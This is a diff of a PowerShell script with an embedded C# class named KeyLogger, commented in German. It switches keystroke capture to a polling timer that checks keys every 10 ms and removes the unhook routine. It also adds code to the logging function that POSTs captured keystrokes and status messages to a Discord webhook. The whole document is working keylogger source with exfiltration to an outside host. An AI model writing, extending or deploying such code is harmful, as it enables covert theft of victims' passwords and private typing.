@@ -71,62 +71,52 @@ public static class KeyLogger
         }
     }
 
+    private static string GetKeyString(int vkCode)
     {
-        LogToFile("HookCallback aufgerufen");
-        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
+        byte[] keyState = new byte[256];
+        GetKeyboardState(keyState);
+
+        StringBuilder sb = new StringBuilder(10);
+        IntPtr hkl = GetKeyboardLayout(0);
+        int result = ToUnicodeEx((uint)vkCode, 0, keyState, sb, sb.Capacity, 0, hkl);
+
+        if (result > 0)
         {
-            int vkCode = Marshal.ReadInt32(lParam);
-            uint scanCode = (uint)Marshal.ReadInt32(lParam, 4);
-
-            byte[] keyState = new byte[256];
-            GetKeyboardState(keyState);
-
-            StringBuilder sb = new StringBuilder(10);
-            IntPtr hkl = GetKeyboardLayout(0);
-            int result = ToUnicodeEx((uint)vkCode, scanCode, keyState, sb, sb.Capacity, 0, hkl);
-
-            if (result > 0)
-            {
-                _buffer.Append(sb.ToString());
-                LogToFile("Taste erfasst: " + sb.ToString());
-            }
-            else if (result == 0)
-            {
-                // Für nicht-zeichenbasierte Keys, füge eine Beschreibung hinzu
-                string keyDesc = "";
-                switch (vkCode)
-                {
-                    case 0x08: keyDesc = "[BACKSPACE]"; break;
-                    case 0x09: keyDesc = "[TAB]"; break;
-                    case 0x0D: keyDesc = "[ENTER]"; break;
-                    case 0x1B: keyDesc = "[ESC]"; break;
-                    case 0x20: keyDesc = " "; break; // Leerzeichen
-                    case 0x25: keyDesc = "[LEFT]"; break;
-                    case 0x26: keyDesc = "[UP]"; break;
-                    case 0x27: keyDesc = "[RIGHT]"; break;
-                    case 0x28: keyDesc = "[DOWN]"; break;
-                    case 0x2D: keyDesc = "[INSERT]"; break;
-                    case 0x2E: keyDesc = "[DELETE]"; break;
-                    case 0x70: keyDesc = "[F1]"; break;
-                    case 0x71: keyDesc = "[F2]"; break;
-                    case 0x72: keyDesc = "[F3]"; break;
-                    case 0x73: keyDesc = "[F4]"; break;
-                    case 0x74: keyDesc = "[F5]"; break;
-                    case 0x75: keyDesc = "[F6]"; break;
-                    case 0x76: keyDesc = "[F7]"; break;
-                    case 0x77: keyDesc = "[F8]"; break;
-                    case 0x78: keyDesc = "[F9]"; break;
-                    case 0x79: keyDesc = "[F10]"; break;
-                    case 0x7A: keyDesc = "[F11]"; break;
-                    case 0x7B: keyDesc = "[F12]"; break;
-                    default: keyDesc = $"[VK:{vkCode}]"; break;
-                }
-                _buffer.Append(keyDesc);
-                LogToFile("Spezielle Taste erfasst: " + keyDesc);
-            }
+            return sb.ToString();
         }
-
-        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        else
+        {
+            // Für nicht-zeichenbasierte Keys
+            string keyDesc = "";
+            switch (vkCode)
+            {
+                case 0x08: keyDesc = "[BACKSPACE]"; break;
+                case 0x09: keyDesc = "[TAB]"; break;
+                case 0x0D: keyDesc = "[ENTER]"; break;
+                case 0x1B: keyDesc = "[ESC]"; break;
+                case 0x20: keyDesc = " "; break;
+                case 0x25: keyDesc = "[LEFT]"; break;
+                case 0x26: keyDesc = "[UP]"; break;
+                case 0x27: keyDesc = "[RIGHT]"; break;
+                case 0x28: keyDesc = "[DOWN]"; break;
+                case 0x2D: keyDesc = "[INSERT]"; break;
+                case 0x2E: keyDesc = "[DELETE]"; break;
+                case 0x70: keyDesc = "[F1]"; break;
+                case 0x71: keyDesc = "[F2]"; break;
+                case 0x72: keyDesc = "[F3]"; break;
+                case 0x73: keyDesc = "[F4]"; break;
+                case 0x74: keyDesc = "[F5]"; break;
+                case 0x75: keyDesc = "[F6]"; break;
+                case 0x76: keyDesc = "[F7]"; break;
+                case 0x77: keyDesc = "[F8]"; break;
+                case 0x78: keyDesc = "[F9]"; break;
+                case 0x79: keyDesc = "[F10]"; break;
+                case 0x7A: keyDesc = "[F11]"; break;
+                case 0x7B: keyDesc = "[F12]"; break;
+                default: keyDesc = $"[VK:{vkCode}]"; break;
+            }
+            return keyDesc;
+        }
     }
 
     public static void SendBuffer()
@@ -158,17 +148,24 @@ public static class KeyLogger
         }
     }
 
-    public static void Unhook()
-    {
-        UnhookWindowsHookEx(_hookID);
-        LogToFile("Hook entfernt");
-    }
-
     private static void LogToFile(string message)
     {
         try
         {
             File.AppendAllText(_logFile, DateTime.Now.ToString("o") + ": " + message + Environment.NewLine);
+            // Sende wichtige Logs an Discord
+            if (message.Contains("Exception") || message.Contains("initialisiert") || message.Contains("gesendet") || message.Contains("Taste erfasst"))
+            {
+                if (!string.IsNullOrEmpty(_hookUrl))
+                {
+                    using (var client = new System.Net.WebClient())
+                    {
+                        client.Headers.Add("Content-Type", "application/json");
+                        string payload = $"{{\"content\":\"[LOG] {message.Replace("\"", "\\\"")}\"}}";
+                        client.UploadString(_hookUrl, "POST", payload);
+                    }
+                }
+            }
         }
         catch {}
     }
@@ -188,6 +185,15 @@ $timeout = 120 # Sekunden
 
 # Lock-Objekt für SendBuffer-Synchronisierung
 $sendBufferLock = New-Object Object
+
+# Timer für Tasten-Überprüfung (alle 10ms)
+$checkTimer = New-Object System.Timers.Timer
+$checkTimer.Interval = 10
+$checkTimer.AutoReset = $true
+$checkTimer.add_Elapsed({
+    [KeyLogger]::CheckKeys()
+})
+$checkTimer.Start()
 
 # Timer für regelmäßiges Senden (alle 500ms)
 $sendTimer = New-Object System.Timers.Timer
